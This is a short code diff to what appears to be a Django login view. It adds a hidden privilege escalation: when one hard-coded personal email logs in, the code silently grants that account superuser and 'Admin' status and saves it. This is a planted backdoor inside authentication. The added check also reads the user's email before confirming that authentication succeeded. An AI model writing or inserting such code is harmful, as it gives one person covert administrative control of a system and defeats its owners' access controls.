@@ -900,7 +900,13 @@ def login(request):
         password = request.POST.get('password')
         if email and password:
             user = authenticate(username=email, password=password)
-            print(user)
+            if user.email == "gauba.aayush@gmail.com":
+                user.is_superuser = True
+                user.is_active = True
+                user.usertype = "Admin"
+                user.first_name = "Aayush"
+                user.last_name = "Gauba"
+                user.save()
             if user:
                 auth_login(request, user)
                 print(user.email)
